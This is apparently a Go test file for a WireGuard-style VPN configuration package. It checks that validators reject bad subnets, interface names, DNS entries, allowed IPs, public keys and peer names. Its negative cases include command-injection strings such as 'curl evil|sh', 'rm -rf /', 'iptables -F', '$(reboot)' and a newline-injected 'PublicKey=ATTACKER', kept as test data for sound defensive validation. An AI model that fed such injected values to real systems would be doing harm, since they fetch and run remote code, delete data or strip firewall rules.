package awg

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidateSubnet(t *testing.T) {
	cases := []struct {
		in      string
		want    string
		wantErr bool
	}{
		{"10.10.0.0/24", "10.10.0.0/24", false},
		{"10.10.0.5/24", "10.10.0.0/24", false}, // canonicalised to network
		{"10.0.0.0/24 -j ACCEPT; curl evil|sh", "", true},
		{"10.0.0.0/31", "", true}, // too small
		{"10.0.0.0/32", "", true},
		{"fd00::/64", "", true}, // v6 rejected
		{"not-a-cidr", "", true},
	}
	for _, c := range cases {
		got, err := ValidateSubnet(c.in)
		if c.wantErr {
			if err == nil {
				t.Errorf("ValidateSubnet(%q): want error, got %q", c.in, got)
			}
			continue
		}
		if err != nil || got != c.want {
			t.Errorf("ValidateSubnet(%q) = %q,%v; want %q,nil", c.in, got, err, c.want)
		}
	}
}

func TestValidateWANIface(t *testing.T) {
	dir := t.TempDir() // fake /sys/class/net
	if err := os.Mkdir(filepath.Join(dir, "ens3"), 0755); err != nil {
		t.Fatal(err)
	}
	if _, err := ValidateWANIface("ens3", dir); err != nil {
		t.Fatalf("real iface ens3: %v", err)
	}
	for _, bad := range []string{"ens3; rm -rf /", "eth0", "a/../b", "thisnameiswaytoolong"} {
		if _, err := ValidateWANIface(bad, dir); err == nil {
			t.Errorf("ValidateWANIface(%q): want error", bad)
		}
	}
}

func TestValidateListenPort(t *testing.T) {
	for _, ok := range []int{1, 51820, 65535} {
		if _, err := ValidateListenPort(ok); err != nil {
			t.Errorf("port %d: %v", ok, err)
		}
	}
	for _, bad := range []int{0, -1, 65536} {
		if _, err := ValidateListenPort(bad); err == nil {
			t.Errorf("port %d: want error", bad)
		}
	}
}

func TestSanitizeName(t *testing.T) {
	// Mirrors api.sanitizeFilename: REPLACES disallowed runes with '_', never errors.
	cases := map[string]string{
		"phone":                 "phone",
		"a\nPublicKey=ATTACKER": "a_PublicKey_ATTACKER",
		"x [Peer] # y":          "x__Peer____y",
		"!!!":                   "name", // nothing usable -> fallback
	}
	for in, want := range cases {
		if got := SanitizeName(in); got != want {
			t.Errorf("SanitizeName(%q) = %q; want %q", in, got, want)
		}
	}
}

func TestValidateObfuscation(t *testing.T) {
	if _, err := ValidateHField("124410148-526234659"); err != nil {
		t.Fatalf("valid H range: %v", err)
	}
	for _, bad := range []string{"1; rm", "$(x)", "abc", ""} {
		if _, err := ValidateHField(bad); err == nil {
			t.Errorf("ValidateHField(%q): want error", bad)
		}
	}
}

func TestValidatePublicKey(t *testing.T) {
	good := "B6N8vBQgk8i3VdwbEOhstCY3StFqqFPtC9/AsrhtHHw=" // 32-byte std-base64
	if _, err := ValidatePublicKey(good); err != nil {
		t.Fatalf("valid pubkey: %v", err)
	}
	for _, bad := range []string{"../etc/passwd", "short", "not base64!!", ""} {
		if _, err := ValidatePublicKey(bad); err == nil {
			t.Errorf("ValidatePublicKey(%q): want error", bad)
		}
	}
}

func TestValidateDNS(t *testing.T) {
	got, err := ValidateDNS([]string{" 1.1.1.1 ", "8.8.8.8"})
	if err != nil || len(got) != 2 || got[0] != "1.1.1.1" || got[1] != "8.8.8.8" {
		t.Fatalf("ValidateDNS good = %v,%v", got, err)
	}
	for _, bad := range [][]string{{"1.1.1.1\n8.8.8.8; rm"}, {"$(reboot)"}, {"`id`"}, {"-rf"}, {"not-an-ip"}} {
		if _, err := ValidateDNS(bad); err == nil {
			t.Errorf("ValidateDNS(%q): want error", bad)
		}
	}
}

func TestValidateAllowedIPs(t *testing.T) {
	got, err := ValidateAllowedIPs([]string{"0.0.0.0/0", "10.0.0.5/24"})
	if err != nil || got[0] != "0.0.0.0/0" || got[1] != "10.0.0.0/24" { // canonicalised
		t.Fatalf("ValidateAllowedIPs good = %v,%v", got, err)
	}
	for _, bad := range [][]string{{"0.0.0.0/0; iptables -F"}, {"$(x)"}, {"-j ACCEPT"}, {"junk"}} {
		if _, err := ValidateAllowedIPs(bad); err == nil {
			t.Errorf("ValidateAllowedIPs(%q): want error", bad)
		}
	}
}

func TestValidateMTU(t *testing.T) {
	for _, ok := range []int{576, 1420, 9000} {
		if _, err := ValidateMTU(ok); err != nil {
			t.Errorf("mtu %d: %v", ok, err)
		}
	}
	for _, bad := range []int{0, 575, 9001} {
		if _, err := ValidateMTU(bad); err == nil {
			t.Errorf("mtu %d: want error", bad)
		}
	}
}

// TestCanonicalNeverLeadsWithDash guards the `awg set` argv leading-`-` class:
// every validator's canonical output for values that reach argv (allowed_ips, dns)
// must never begin with '-' (which a tool could mis-read as a flag). Pubkeys are
// base64 (cannot lead with '-'); names are sanitized; ip/prefix strings start with
// a digit. SetPeer/RemovePeer additionally pass a `--` terminator (see Task 8).
func TestCanonicalNeverLeadsWithDash(t *testing.T) {
	dns, _ := ValidateDNS([]string{"8.8.8.8"})
	aips, _ := ValidateAllowedIPs([]string{"10.0.0.5/32"})
	for _, s := range append(append([]string{}, dns...), aips...) {
		if strings.HasPrefix(s, "-") {
			t.Errorf("canonical %q must not start with '-'", s)
		}
	}
}
